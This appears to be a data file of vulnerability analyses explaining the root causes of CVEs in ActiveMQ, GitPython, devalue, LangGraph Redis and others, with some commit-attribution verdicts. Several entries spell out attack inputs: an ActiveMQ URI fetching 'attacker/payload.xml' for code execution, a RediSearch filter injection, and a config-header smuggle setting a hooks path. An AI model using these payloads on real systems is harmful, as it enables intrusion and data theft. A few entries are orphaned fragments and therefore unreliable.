causal_chain.bug_semantics: Scriban's recursive-descent expression parser treats nested parentheses as ScriptNestedExpression nodes. ParseParenthesis consumes '(' and immediately calls ExpectAndParseExpression, which re-enters ParseExpression; each nesting level consumes native stack. Through 6.5.8, ParserOptions.ExpressionDepthLimit is a nullable int defaulting to null, and EnterExpression only logs when that option is set, so the PoC template {{ ((((...1...)))) }} with thousands of parens reaches an uncatchable StackOverflowException and kills the host process (CWE-674 DoS). 6.6.0 turns on a default of 250 at EnterExpression (`ExpressionDepthLimit ?? 250`) so the existing depth counter fires without an explicit caller setting.

causal_chain.bug_semantics: AWS CDK L2 CodeBuild Project.renderLoggingConfiguration maps user-facing S3LoggingOptions.encrypted (positive polarity: true means encrypt S3 build logs) directly onto CloudFormation AWS::CodeBuild::Project LogsConfig.S3Logs.EncryptionDisabled (negative polarity: true means do not encrypt). Explicit encrypted:true therefore synthesizes EncryptionDisabled:true and disables CodeBuild's default AWS-managed encryption of S3 logs; encrypted:false synthesizes EncryptionDisabled:false and leaves encryption on. Omitting encrypted passes undefined, so CloudFormation keeps the encrypt-by-default behavior. The same module already implemented the correct negation for artifact encryption (artifacts.ts: encryptionDisabled: this.props.encryption === false ? true : undefined). After 2023-01-05, S3 SSE-S3 default encryption still encrypts new objects, so residual exposure is mainly pre-that-date logs in buckets without default encryption, matching the low-severity GHSA.

causal_chain.bug_semantics: praisonai serve agents builds a FastAPI app whose agent-invocation routes execute YAML-defined agents. From first introduction, the CLI help and cmd_agents argument spec advertised --api-key as authentication and parsed it into config, but _create_agents_app() never compared that key and never attached auth middleware or Depends. An unauthenticated POST to /agents (and, after 6a99b73fc, POST /agents/{agent_name}) therefore reached AgentsGenerator / agent.start() even when the operator passed --api-key. Impact is CWE-306 missing authentication for critical function: unauthenticated network callers can invoke exposed agents and any tools those agents hold.

causal_chain.bug_semantics: During a source Hopper/FA3 build, download_and_copy() in hopper/setup.py downloads an NVIDIA nvcc/ptxas archive and extracts it with bare tarfile.extractall(path=tmp_path) into the predictable cache ~/.flashattn/nvidia/<name> (from get_flashattn_cache_path()). extractall follows a pre-planted symlink at tmp_path (and does not filter tar members), so a local attacker who plants ~/.flashattn/nvidia/nvcc -> attacker-chosen dir before pip install causes the victim's build to write toolchain binaries (or overwrite files) at that location with the victim's privileges (CWE-59). shutil.copy then also follows the resolved path. causal_chain.bug_semantics: devalue.uneval serializes a value to JavaScript source that callers eval to rehydrate it. For plain objects it walks enumerable own keys and emits them as unquoted identifiers via safe_key/safe_prop whenever they match /^[_$a-zA-Z][_$a-zA-Z0-9]*$/. An attacker-controlled object can carry an own enumerable `__proto__` key (JSON.parse('{"__proto__": <payload>}')), which passes that regex. The generated code is therefore `{__proto__:<payload>}` for a non-repeated object or `name.__proto__=<payload>` for a repeated one. Evaluated as JS, those forms are prototype setters, not own-property writes: the reconstituted object lacks the own `__proto__` key and instead has a polluted [[Prototype]]. That is CWE-1321 and matches the advisory (output shape differs from input). The 5.6.3 fix fails closed by throwing DevalueError before emission when any own key is `__proto__`.

Mechanism: lib/setup-sandbox.js checkBufferAllocLimit is installed only on Buffer.alloc / allocUnsafe / allocUnsafeSlow and deprecated Buffer(N)/new Buffer(N). Sandbox Buffer.concat is the bridge proxy of host Buffer.concat, which calls host Buffer.allocUnsafe(totalLength) without the sandbox allocUnsafe wrapper. No sandbox escape; host-memory DoS (CWE-770).

causal_chain.bug_semantics: Feishu im.message.reaction.created_v1 is turned into a synthetic FeishuMessageEvent by resolveReactionSyntheticEvent and dispatched through handleFeishuMessage. Authorization is keyed off event.message.chat_type: bot.ts sets isGroup only when chatType === "group", and only that branch applies groupAllowFrom (group ID allowlist) and requireMention (default true). Before 2026.3.12, omitted or non-group event.chat_type was forced to p2p while chat_id still came from the event or from getMessageFeishu's looked-up group oc_ id. A group reaction that omitted chat_type was therefore authorized as a DM: groupAllowFrom was skipped and requireMention stayed false, so an unmentioned group reaction could drive an agent turn.

causal_chain.bug_semantics: An authenticated HTTP client of ActiveMQ Classic's Jolokia JMX-HTTP bridge (POST /api/jolokia/, often admin:admin) can invoke exec on BrokerViewMBean.addNetworkConnector(String) or addConnector(String) because the shipped jolokia-access.xml allows operation=* on org.apache.activemq:*. Those JMX methods pass the attacker-controlled discovery URI straight into BrokerService with no scheme checks. A URI such as static:(vm://rce?brokerConfig=xbean:http://attacker/payload.xml) is parsed as a discovery/composite network connector whose component is the in-JVM vm transport. VMTransportFactory, when the named broker does not exist, reads brokerConfig and treats it as a broker factory URL; the xbean: scheme loads that URL with Spring ResourceXmlApplicationContext, which instantiates all singleton beans (ProcessBuilder.start / Runtime.exec / MethodInvokingFactoryBean) before BrokerService validates the resulting configuration. The result is RCE in the broker JVM. Native JMX would hit the same unvalidated BrokerView methods; Jolokia is the documented HTTP source.

causal_chain.bug_semantics: Nomad workload-identity ACL policies can be attached to a specific job. Claim resolution called StateStore.ACLPolicyByJob, which queried the acl_policy memdb table with index name "job_prefix" rather than the exact "job" index. go-memdb prefix scans return every policy whose (namespace, jobID) key starts with the requested pair, so a job whose ID is a prefix of another job's ID (example: policy bound to test-job is also applied to test-job-2). The extra policies are merged into the workload token, incorrectly assigning privileges and allowing policy shadowing. The 1.10.2 fix performs an exact-match Get on index "job".

causal_chain.bug_semantics: free5GC NEF exposes the AF-facing 3GPP PFD-management SBI (prefix /3gpp-pfd-management/v1, routes /:scsAsID/transactions and /:scsAsID/transactions/:transID) without inbound OAuth2/bearer verification. NewServer() always registered that gin group with applyRoutes and no authorization middleware, and ServiceList was not used as a mount gate, so the API stayed reachable even when config only listed nnef-pfdmanagement/nnef-oam. Context only implemented outbound GetTokenCtx. POST allocates an AfPfdTrans and PUTs PFDs into UDR; GET reads that state; DELETE removes it. A network attacker who can reach NEF therefore creates, reads, or deletes policy-classification state with a forged Bearer token, poisoning SMF/UPF detection rules or denying legitimate PFDs.

causal_chain.bug_semantics: A remote attacker can POST a large URL containing Unicode code points that are expensive under NFKC (Django's regression uses U+00BE '¾' repeated) into a forms.URLField. to_python() always ran urllib.parse.urlsplit() on the raw value to prepend a default scheme and rebuild host/path. On Windows, CPython urlsplit() NFKC-normalizes that string, so an unbounded input burns CPU before URLValidator runs (CWE-400/770 DoS). The 2026 fix stopped calling urlsplit() and detects a scheme with str.partition(':'), leaving structural checks to validators.

causal_chain.bug_semantics: selinux_sctp_bind_connect() is the SELinux implementation of security_sctp_bind_connect(). From its first write it copies sk->sk_socket into a struct socket * and passes that pointer into selinux_socket_bind() and selinux_socket_connect_helper(), which immediately load sock->sk and never otherwise need the socket object. SCTP Dynamic Address Reconfiguration (ASCONF ADD_IP/SET_PRIMARY) invokes the same hook from net/sctp/sm_make_chunk.c on asoc->ep->base.sk in the receive/softirq path. After userspace close(), sk->sk_socket can already be NULL while associations still process authenticated ASCONF chunks, so the SELinux hook NULL-dereferences sk_socket and oopses/panics the host. setsockopt bindx/connectx/set_primary and sendmsg-connect hold a file reference and are not the crashing path. The 2026 fix stops touching sk_socket by teaching the bind/connect helpers to take struct sock * directly.

causal_chain.bug_semantics: Spring Security 7 maps HttpSecurity.securityMatcher(String...) (advisory wording: securityMatchers(String)) through a PathPatternRequestMatcher.Builder shared object. HttpSecurityConfiguration.createSharedObjects() always constructed a default PathPatternRequestMatcherBuilderFactoryBean with no basePath, so a published PathPatternRequestMatcher.Builder bean that prepends a servlet path (the Spring Boot spring.mvc.servlet.path pattern) was ignored. A chain configured as securityMatcher("/admin/**") therefore matched /admin/** instead of /<servlet-path>/admin/**. Intended requests missed that filter chain, so authentication, authorization, and other security components were not applied (CWE-693). authorizeHttpRequests/requestMatchers(String) via AbstractRequestMatcherRegistry already used getIfUnique on the bean after aeb2dbc; the broken path is the securityMatcher(String...) shared-object lookup.

causal_chain.bug_semantics: Invoice Ninja v5 setup endpoints POST /setup/check_db and POST /setup/check_mail are registered with guest middleware, so they remain reachable after installation. CheckDatabaseRequest::authorize() (and the twin CheckMailRequest::authorize()) originally returned true unconditionally, with an in-source TODO to gate on Ninja::hasCompletedSetup(). After Laravel form-request authorization succeeds, SetupController::checkDB passes the request into SystemHealth::dbCheck, which overwrites the MySQL connection host/port/database/user/password from attacker-controlled form fields and calls getPdo(); checkMail likewise points the mailer at attacker-controlled mail_host/mail_port and attempts an SMTP send. That is unauthenticated blind connect-SSRF (CWE-918): the server opens TCP to arbitrary internal or metadata addresses (e.g. 169.254.169.254) and the boolean/error response is a connectivity oracle. The 2026-01-25 fix denies hosted instances and, when the configured DB is reachable, allows the check only if the accounts table is missing or empty (setup not completed).

That is the smallest public first-write of the exploitable conjunction; its parent addfcfe4 still used the narrower list, verified directly. The #9945 squash onto main is 4e81b2cab and is not used as BIC. Direct fix bc810f99 (PR #23781) adds _check_key_admin_access before mutation and is in v1.83.3-stable. VulDB's 1.63.1 affected range is inconsistent with tags (exposure starts v1.66.0-nightly / v1.67.0-stable) but does not invalidate the advisory. AI is judged only on the BIC commit object: human maintainer Ishaan Jaff, no AI markers, therefore NOT_AI. The later Claude co-author on the fix is irrelevant to introduction.

causal_chain.bug_semantics: On a live RTP/WebRTC session the multiplexed RTP/ICE UDP socket is advertised in ICE candidates and accepts packets before DTLS and before STUN MESSAGE-INTEGRITY. UdpReceiver.EndReceiveFrom copies the datagram and invokes OnRTPPacketReceived with no local catch. The vulnerable handler admitted any non-empty packet, then read packet[1] (TURN Data Indication discriminator) and/or called STUNMessage.ParseSTUNMessage. A 1-byte packet throws IndexOutOfRangeException; a STUN message with XOR-MAPPED-ADDRESS/XOR-PEER-ADDRESS/XOR-RELAYED-ADDRESS (or MappedAddress) of length 0-7 throws NullReferenceException/IndexOutOfRangeException/ArgumentOutOfRangeException in STUNXORAddressAttribute/STUNAddressAttribute because those constructors index attributeValue[1], AsSpan(2) and AsSpan(4) without a length check. The EndReceiveFrom catch-all converted that exception into Close(), tearing down the media session. One unauthenticated packet is therefore a remote DoS (availability only).

causal_chain.bug_semantics: Kiota's C# generator copies attacker-controlled OpenAPI text (operation/schema/parameter description; later also externalDocs.description as DocumentationLabel and externalDocs.url as DocumentationLink) into generated single-line /// XML documentation comments. The C# writer prefixes each WriteLine with '/// ' but, until the 2026 fix, only XML-escaped the payload (CleanupXMLString) and never stripped line terminators. A newline in the OpenAPI field terminates the comment; the remainder is emitted at namespace/type scope and is compiled when a developer or CI builds the generated client. CleanupDescription (from 2022) stripped only [\r\n\t] at some CodeDOM assignment sites, so Unicode NEL/LS/PS in descriptions still reached the sink, and ExternalDocs label/link never went through CleanupDescription at all. Practical preconditions are an untrusted or tampered OpenAPI description used as generation input.

causal_chain.bug_semantics: GHSA-92hr-gmr6-h8cp is a published medium hardening cluster (no CVE, not withdrawn) of six independent source-to-sink flaws, all still present at tag 3.2.0 and closed together by 7ea9970 in 3.3.0. (1) CWE-330: pad_utils.randomString samples Math.random to mint author/session/readonly IDs (generateAuthorToken prefixes t.); those IDs are cookies/identifiers, so a predictable PRNG is the source and token acceptance is the sink. (2) CWE-208/307: POST /interaction/:uid login maps settings.users then compares user.password === password in non-constant time with no failure delay, enabling password/oracle timing and prototype-key lookup. (3) CWE-22: plugin package.json dependency names are interpolated into path.join(pluginInstallPath, dependency, ...) / symlink targets without an npm-name grammar check (admin-gated). (4) CWE-235: /api/2 RestAPI merges every request header into the API field set via Object.assign({}, headers, params, query, formData), so header names collide with API parameters (authorization included). (5) appendChatMessage omits existence checking; sendChatMessageToPadClients/getPad creates an arbitrary pad as a side effect. (6) CWE-209: the admin static file handler echoes fs.readFile err to the client.

LIKE '%{query}%'") and later a login query interpolating username/password. causal_chain.bug_semantics: Unauthenticated panic DoS (CWE-476/CWE-20). Source: StartActionByGet accepts an arbitrary actionId, looks up a binding with FindBindingByID, and still calls Executor.ExecRequest when the lookup is nil. ExecRequest allocates and SetLog()s an InternalLogEntry (Binding copied from the request, so nil) before the command chain runs. stepRequestActionHasBinding then returns false, so execution stops, but the tracking ID remains in the log map. Sink: KillAction and RestartAction load that log and immediately evaluate execReqLogEntry.Binding.Action without testing Binding; the nil pointer panics in the HTTP/Connect handler (curl 52 empty reply), before ACL. Because StartActionByGet does not wait on the executor goroutine, an attacker can mint orphan tracking IDs and repeatedly crash handlers. Parent behavior was nil-safe: KillAction used cfg.FindAction(title) and returned when action was nil; RestartAction did not exist.

causal_chain.bug_semantics: fast-uri parse() for HTTP-family URLs (scheme handlers with domainHost:true) runs an IDN conversion when the host matches nonSimpleDomain. After the node:url import was removed, that path called URL.domainToASCII on the global WHATWG URL constructor, where the helper does not exist. The resulting TypeError was swallowed into parsed.error while parsed.host stayed in its original Unicode form, and parse()/normalize()/equal() still returned that object/string. An attacker can therefore present a host such as 127。0。0。1 that fails a fast-uri denylist/loopback/redirect check but is canonicalized to 127.0.0.1 by Node's URL parser and fetch(), producing a policy/use desync (CWE-436 / CWE-551).

SearchExperiments/SearchRegisteredModels later gained AFTER filters; SearchModelVersions did not. GraphQLAuthorizationMiddleware.PROTECTED_FIELDS (Dec 2025) likewise omitted mlflowSearchModelVersions, so the GraphQL query resolved unfiltered. The 3.10.0 fix filters REST and GraphQL results by parent-model READ.

causal_chain.bug_semantics: Spring Security one-time-token login authenticates by calling OneTimeTokenService.consume(); a successful consume must be single-use. JdbcOneTimeTokenService.consume() issues an auto-commit SELECT (selectOneTimeToken) and, if a row exists, a separate auto-commit DELETE (deleteOneTimeToken) whose jdbcOperations.update rowcount is discarded; it then returns the already-loaded token unless isExpired(). Two concurrent /login/ott submissions with the same valid token can both pass the SELECT before either DELETE commits, both treat consume as success, and both establish sessions. InMemoryOneTimeTokenService is unaffected because ConcurrentHashMap.remove is atomic. Attack requires explicit oneTimeTokenLogin() plus an explicit JdbcOneTimeTokenService bean.

causal_chain.bug_semantics: aiohttp's client follows 3xx responses by looping in ClientSession._request and sending a new ClientRequest built from the same caller headers mapping. Cookie-jar cookies are re-filtered per hop URL, but an explicit Cookie request header is copied into that reused CIMultiDict and then merged by ClientRequest into the outgoing Cookie header with no origin check. Proxy-Authorization supplied as a request header is likewise reused. On cross-origin redirect the client already dropped Authorization (and cleared auth) but left those two headers, so a first-hop server can 3xx to another origin and receive the caller's cookie and proxy credentials. The 3.13.4 fix pops Cookie and Proxy-Authorization in the same origin-change block.

causal_chain.bug_semantics: The openssl-encrypt CLI entry for `hsm` calls crypt_cli.handle_hsm_command, not the unused click frontend in hsm_cli.py. On `fido2-test` (and later `onlykey-test`) success, the handler takes the plugin-returned hsm_pepper and unconditionally writes Pepper (hex): {pepper.hex()} to the terminal (originally print/stdout, later eprint/stderr). That value is hardware-derived KDF material and can persist in scrollback, session recordings, or CI logs. A sibling sink in the FIDO2 plugin logged raw prf/hmac-secret output (prf_data) at debug and embedded it in a user-visible PluginResult error. Impact is bounded because the diagnostic salt is random per invocation and peppers are salt-bound, so the leaked bytes cannot decrypt existing files. An H1 patch on 2026-07-07 removed only the hsm_cli.py echo, so the live path kept printing until 1.4.8.

The bolt backend queries storm Prefix on share.Link.Path and deletes every matching hash. Because Path is a global index, deleting /a also matches /admin/... share records owned by other users (including admins). share.Link.UserID exists and Gets() already filters by it; the explicit share-delete HTTP path later enforces owner-or-admin, but this file-delete side effect never did. causal_chain.bug_semantics: devalue.parse JSON-parses a payload then unflatten/hydrate reconstructs values. Two typed-array encodings can yield a result object that owns a `__proto__` key. (1) Malformed Object-wrapper: stringify of boxed primitives emits ["Object", primitive], but parse historically did Object(value[1]) on the raw JSON slot. A payload such as [["Object",{"__proto__":1}],{}] therefore returns the JSON.parse object whose own `__proto__` property JSON.parse created via [[DefineOwnProperty]]. (2) Null-prototype objects: ["null", key, idx, ...] does Object.create(null) and assigns keys with obj[key] = hydrate(idx); key '__proto__' becomes an own property because there is no prototype setter. A caller that then does Object.assign(target, result) copies that enumerable own `__proto__` via [[Set]], invoking target's setter and replacing target's [[Prototype]]. Regular POJO hydration already rejected `__proto__` keys from 5.3.2 (0623a47 / GHSA-vj54-72f3-p5jv / CVE-2025-57820); this GHSA is the remaining emission paths. It is not CVE-2026-30226 / GHSA-cfw5-2vxh-hr84 (in-library prototype pollution).

causal_chain.bug_semantics: A privileged admin uses TinyMCE image upload (POST admin.tinymce.upload). TinyMCEController::storeMedia() stored the raw upload with Laravel UploadedFile::store() and no server-side MIME or extension allowlist. Laravel 8+ names stored files via hashName()/guessExtension() from content MIME, so a file named .png whose bytes are HTML/JavaScript is written as <hash>.html under the public tinymce disk. Opening that URL executes the script in the admin origin (stored XSS). Client accept=image/* is not a control. The 2.3.8 fix rejects non-image MIME types and requires the client original extension to match the detected image MIME before store().

causal_chain.bug_semantics: DotGit treats a Git reference name as a relative filesystem path under the repository's .git directory. SetRef writes the loose-ref file with d.fs.Create(r.Name().String()) (later fileName := r.Name().String() into setRef); Ref reads via readReferenceFile(".", name.String()); RemoveRef deletes via d.fs.Join(".", name.String()). Because the name is not required to stay under refs/ (or a one-level [A-Z_] pseudo-ref) and is not stripped of '.'/'..'/NTFS/HFS disguises, a name such as refs/heads/../../config or a mapped refs/remotes/origin/../../config resolves to .git/config. A malicious Git server can advertise such a name; clone/fetch refspec mapping can preserve the traversal. Only filesystem-backed storage/filesystem/dotgit is affected; storage/memory never turns names into paths. The 2026 patches add validReferenceName (IsSafe plus control-character and NTFS/HFS hardening) at those storage entry points and reject ErrReferenceNameEscape before any path join.

causal_chain.bug_semantics: LibreChat RBAC middleware generateCheckAccess/checkAccess treated a permissions array as a disjunction. For a given PermissionTypes bucket it called permissions.some(): if any listed flag was true on the role (or, via bodyProps, any named body field was present), the request continued. Create/delete/share routes passed ['USE','CREATE'] intending conjunction — USER may USE agents/prompts but must also have CREATE to mint or delete them. A USER with USE:true and CREATE:false therefore passed checkAgentCreate (POST /api/agents, DELETE /api/agents/:id, duplicate) and analogous PROMPTS checks. The same OR applied to bodyProps SHARED_GLOBAL gating. Source is the .some() loop; sink is Express next() on those routes. Direct fix switches both loops to .every().

causal_chain.bug_semantics: SWS maps a request URI onto a filesystem path by joining the configured web root with sanitize_path() segments (rejecting '..' and backslash only), then stats and opens that path with symlink-following APIs (std::fs::metadata / File::open). A last-component symlink inside the web root whose target is outside the root (advisory PoC: webroot/escape.txt -> $HOME/.bashrc) is therefore followed and the target bytes are returned over HTTP. Directory listing used following metadata and, for symlink-typed entries, canonicalized the target without requiring it to remain under the root, so escaped names could also appear in indexes. --disable-symlinks (added 2024, default false) denied all symlink access only when enabled; it did not enforce web-root containment when following remained allowed. CWE-61; CVE-2025-67487 / GHSA-459f-x8vq-xjjm.

causal_chain.bug_semantics: A user with lang-edit can upload a ZIP on a Language Support translation field (InputfieldFile unzip=1 → WireUpload extractArchives). saveUploadZip() writes the archive under site/assets/files/<language_id>/.zip_tmp/ and immediately calls WireFileTools::unzip() / historically wireUnzipFile(). unzip() iterates every ZipArchive entry and extractTo()s it with only a later '..' substring skip and no cap on uncompressed bytes, entry count, depth, or time. Extension and size filtering in saveUploadZip() run only after extraction, so a small highly-compressible ZIP of allowed-looking *.json entries can expand to multi-GB (CPU/disk DoS, ENOSPC cascade) before cleanup. Nested leftover ZIPs are a secondary post-extract cleanup bug, not the zip-bomb sink.

causal_chain.bug_semantics: Deriver::derive takes a caller &mut [u8], sets len = buf.len(), and passes (buf.as_mut_ptr(), &mut len) to OpenSSL EVP_PKEY_derive from otherwise safe Rust. PkeyCtxRef::derive does the same for Option<&mut [u8]>. The binding trusts OpenSSL to honor *keylen. On OpenSSL 1.1.x (and LibreSSL), the X25519, X448, DH, and HKDF-extract methods ignore the incoming length and unconditionally write the full shared secret (32, 56, or prime-size bytes). A short stack or heap slice is therefore overflowed. OpenSSL 3.x providers reject undersized buffers themselves, so the crash/corruption is specific to older OpenSSL. causal_chain.bug_semantics: write_file and patch in hermes-agent refuse writes to sensitive system prefixes by calling _check_sensitive_path. That helper resolves the user path with os.path.realpath and then tests whether the resolved string starts with /etc/, /boot/, or /usr/lib/systemd/. On macOS /etc is a symlink to /private/etc, so a write to /etc/hosts (or a symlink whose realpath is under /private/etc) becomes /private/etc/hosts, which does not start with /etc/, and the checker returns None. The write then proceeds at OS permission level. Issue #8734 reproduced this through the API server: write_file('/etc/hosts') was not policy-blocked on Darwin while /boot/grub.cfg was. The same list also omitted /private/var (macOS /var symlink). This is CWE-59: the blocklist is applied to a fully resolved path without including the platform's resolved sensitive prefixes (and without also matching the unresolved path).

causal_chain.bug_semantics: High-privileged Magento admins can store Magento template directives in email templates and other fields processed by Magento\Email\Model\Template\Filter (CMS Filter extends it). The {{block class='...'}} / {{block id='...'}} SSTI path hits blockDirective, which instantiates an arbitrary layout block, copies attacker-controlled parameters onto it, and invokes toHtml() without setting cache_key. AbstractBlock then stores the rendered HTML under the block class's default cache key (CACHE_KEY_PREFIX + hash of getCacheKeyInfo()), colliding with the same block when rendered from layout — including Backend\Block\Menu ('admin_top_nav'). Cached XSS is later served to other admins (menu-bar replacement / session theft). Adobe's VULN-31609 / AC-14694 fix pins cache_key to getCacheKey() after directive params are applied so template-rendered blocks no longer share that default cache namespace.

causal_chain.bug_semantics: The backend Table widget partial emits the unsanitized GET parameter search into an HTML raw-text <script type="text/template"> block as value="<?= get('search') ?>". Attribute quotes are not a parser boundary there, so a crafted query containing a literal </script> (including mixed-case or whitespace variants) terminates the template early and injects markup/script into an authenticated backend page. get() is not HTTP-method-restricted, and the template is rendered even when searching is disabled, so any Table/DataTable page is a sink (in core, Editor Settings gated by backend.manage_editor). The 1.2.14 fix HTML-encodes the value with e() so the terminator cannot appear as raw text.

The patch clamps days to [1, 1095] at the route before the sink is called.

causal_chain.bug_semantics: apko key discovery treats a repository JWKS document as a list of RSA public keys. InitDB walks configured repositories, fetchChainguardKeys calls DiscoverKeys, which GETs `{repository}/apk-configuration`, reads `jwks_uri`, decodes the JWKS, and for each key does an unchecked `key.Key.(*rsa.PublicKey)` before PKIX/PEM-encoding it as `{kid}.rsa.pub`. If that endpoint (attacker-influenced or simply EC/Ed25519) returns a non-RSA key, Go's type assertion panics and the process exits. Impact is availability only (CVSS 6.5, UI:R). The 1.2.7 fix keeps RSA-only behavior but returns a typed error instead of panicking.

causal_chain.bug_semantics: web_crawl()/crawl_web() accept attacker- or LLM-supplied URLs and, in the httpx fallback provider, fetch them with httpx.Client(follow_redirects=True) or urllib.request.urlopen (redirects on by default), returning the response body as tool output. From praisonaiagents 1.5.126 an SSRF check resolves the initial hostname once via socket.gethostbyname and rejects loopback/private/link-local results, but it never pins that IP and never re-validates redirect Location targets. An attacker domain that resolves public at check time can therefore (1) 302 to 169.254.169.254/loopback/RFC1918 or (2) DNS-rebind to a private address at connect time, leaking internal HTTP and cloud-metadata contents into the agent. Direct loopback URLs are blocked after the incomplete check, which is why the advisory's control vs redirect/rebind PoCs distinguish a genuine validate-then-fetch gap.

causal_chain.bug_semantics: The administrative delete endpoint GET|POST /account/delete/<id> (account_blueprint, @login_required) immediately deleted another user when the caller was an admin. Flask-WTF CSRFProtect was already enabled but does not check GET, so a cross-site GET (malicious link, top-level navigation, or embedded request) replayed the admin session cookie and deleted the targeted account without a CSRF token. The admin UI confirmed deletion via an <a href> GET to that URL. The patch removed GET from the route and switched the UI to a POST form carrying csrf_token().

causal_chain.bug_semantics: An authenticated user with document-upload permission submits a remote document whose doc_url points at an arbitrary HTTP(S) target (loopback, RFC1918, link-local, or cloud metadata). DocumentCreateForm/API persist that URL without SSRF checks. Upload then calls resource_manager.set_thumbnail, which for Document runs create_document_thumbnail. That task treats document.doc_url as a filesystem path, StorageManager.open fails locally, and DataItemRetriever.transfer_remote_file fetches the URL via smart_open with no private-IP filtering or redirect validation, causing the server to issue the attacker-chosen request. The original implementation used requests.get(document.doc_url) for the same fetch.

causal_chain.bug_semantics: GitPython's GitConfigParser._write.write_section interpolates the in-memory section name as a raw git-config header via fp.write(("[%s]\n" % name).encode(...)). Repo.config_writer().set_value(section, option, value) (and add_section/set/add_value/rename_section) stored that name without rejecting CR, LF, or NUL. An attacker-controlled section such as "user]\n[core" is therefore serialized as two valid headers, [user] then [core], so a following option like hooksPath=/tmp/evil_hooks becomes core.hooksPath in .git/config. Git honors that path; a later commit/merge/checkout runs hooks from the attacker directory (RCE). This is a residual bypass of the 3.1.49 value-only guard, which blocked the same outcome when newlines were smuggled in the value argument (indented [core] continuation) but left the section/option names unsanitized.

causal_chain.bug_semantics: A committed .kiota/workspace.json (documented team workflow) is deserialized on kiota client generate / kiota plugin generate. Each consumer's outputPath is copied into GenerationConfiguration.OutputPath with no workspace-root confinement. KiotaBuilder then CreateDirectory/writes the generated client (and can CleanOutput-delete) at that path. An attacker who lands a malicious PR or poisons a repo can set outputPath to an absolute POSIX path, UNC, Windows drive path, or a .. traversal; a teammate or CI running the documented regenerate command writes attacker-chosen files outside the workspace (CWE-22). Vendor states descriptionLocation generation-time fetch is intentional and not this vulnerability; only outputPath is patched.

causal_chain.bug_semantics: In @langchain/langgraph-checkpoint-redis, RedisSaver.list() and ShallowRedisSaver.list() build a RediSearch query by concatenating filter clauses. String filters were interpolated as (@${key}:{${value}}) with no escaping of RediSearch syntax. An attacker who can supply list()/getStateHistory() filter values (typical of user-facing history APIs) can inject | (OR) and braces, e.g. source="x}) | (@thread_id:{*", producing (@thread_id:{victim}) (@source:{x}) | (@thread_id:{*}). RediSearch AND-binds tighter than OR, so the second clause matches every thread and returns other tenants' checkpoint documents from ft.search on the checkpoints index. The 1.0.2 patch escapes filter keys and values via escapeRediSearchTagValue before interpolation.

causal_chain.bug_semantics: Authenticated SSRF (CWE-918) on the XXL-JOB admin manual trigger path. An attacker who can log in and who has permission on at least one job group posts /jobinfo/trigger with an arbitrary addressList. JobInfoController.triggerJob forwards that string through XxlJobServiceImpl.trigger (login + job-group ACL only) into JobTrigger.trigger, which overwrites the in-memory XxlJobGroup to addressType=1 and addressList=user input. getRegistryList() then splits that CSV into executor URLs. doTrigger builds an HTTP ExecutorBiz client to each URL, attaching XXL-JOB-ACCESS-TOKEN and POSTing a TriggerRequest (jobId, handler, params, glueSource, logId, etc.). The admin therefore originates server-side HTTP from its network position to attacker-chosen destinations, leaking the platform token and job metadata. JobGroupController HTTP/HTTPS checks on saved groups do not apply to this per-trigger override. CVSS PR:L matches the login/ACL preconditions; the maintainer dispute does not remove the request-forgery mechanism.

causal_chain.bug_semantics: Steganography pixel/sample selection treated a password-derived integer as a Python random / NumPy MT seed. generate_pseudorandom_sequence(seed, length, max_value) did random.seed(seed); random.sample(range(max_value), ...), and the live LSB hide/extract path did random.seed(self.seed); random.shuffle(pixel_indices) with self.seed = int.from_bytes(sha256(password)[:8]). Because MT is a non-crypto PRNG with a truncated seed, anyone who knows or brute-forces the password (or recovers ~624 outputs) can regenerate the exact cover indices and extract the hidden payload. The 1.4.0 fix replaces both the helper and the live shuffles with HMAC-SHA256 Fisher-Yates / numpy Generator seeded from HMAC.

causal_chain.bug_semantics: In @better-auth/oauth-provider, /oauth2/token accepts an RFC 8707 resource parameter and checkResource() copies it into the JWT aud claim after checking only the server-wide validAudiences allowlist. /oauth2/authorize never records the requested resource on the authorization code, and oauthRefreshToken has no resources column, so handleAuthorizationCodeGrant and handleRefreshTokenGrant both re-derive audience from the current token-request body. A client that completes a normal authorization (or holds a refresh token issued for one audience) can mint an access token for any other allow-listed resource, bypassing the grant's authorization boundary. RFC 8707 requires recording resources at authorization and allowing only subset narrowing at token/refresh.

The advisory is a live vendor/CVE record of missing RFC 8707 grant-to-audience binding in @better-auth/oauth-provider, not a withdrawal. The defective mechanism is checkResource() taking resource only from the token request body and allowlisting it, then minting JWT aud, while authorization codes and refresh tokens store no resource set. That helper and the /oauth2/token resource field were first written in public PR-member 7eb90a95 when the oauth-provider package was added; the parent tree lacks the package, so this is original introduction rather than a later exposure. Squash 686fba4e1 and v1.4.x backport f1b90e408 are carriers of the same token.ts blob and are rejected as BICs. Direct fix b4b086722 (PR #9836) closes the same path by recording resources at authorize, storing them on the grant, and enforcing subset narrowing with invalid_target; it is in 1.7.0-beta.4 / 1.7.0 and absent from 1.6.x as the vendor stated. AI attribution is judged only on 7eb90a95: named human author/committer, no AI trailers. Cubic review notes in the commit message are not commit-object AI authorship. Verdict is NOT_AI.

causal_chain.bug_semantics: A low-privileged or unauthenticated caller of the database-backed AI Gateway can create a gateway secret whose api_key is a $ENV_VAR reference and point the secret/endpoint auth_config.api_base at an attacker host. On /gateway/{endpoint}/mlflow/invocations, gateway_api.py builds OpenAIConfig/LiteLLMConfig/other provider configs from the decrypted secret. Those models validate api_key through _resolve_api_key_from_input, which historically treated a $-prefixed string as a server environment variable name and substituted os.environ. The resolved value is then placed in the upstream Authorization (or equivalent) header, so server credentials such as AWS_ACCESS_KEY_ID/AWS_SECRET_ACCESS_KEY are exfiltrated to the attacker-controlled api_base (CWE-201).

causal_chain.bug_semantics: Pillow ImageCmsTransform.apply(im, imOut) is a public API that, before 12.3.0, forwarded a caller-supplied output image into native pyCMSdoTransform() without checking that im.mode equals the transform input mode or that imOut.mode equals the transform output mode. The C wrapper only requires imOut to be at least as large in x/y. LittleCMS then writes according to the transform's LCMS type: findLCMStype maps RGB/RGBA/RGBX to TYPE_RGBA_8 (4 bytes/pixel). An RGBA->RGBA transform applied to an L output image therefore writes 4*width bytes into a 1*width-byte row, a controlled heap out-of-bounds write (CWE-787). The higher-level applyTransform() wrapper did not pass a caller imOut, but the class method did, which is the path in GHSA-9hw9-ch79-4vh6 / CVE-2026-59205.

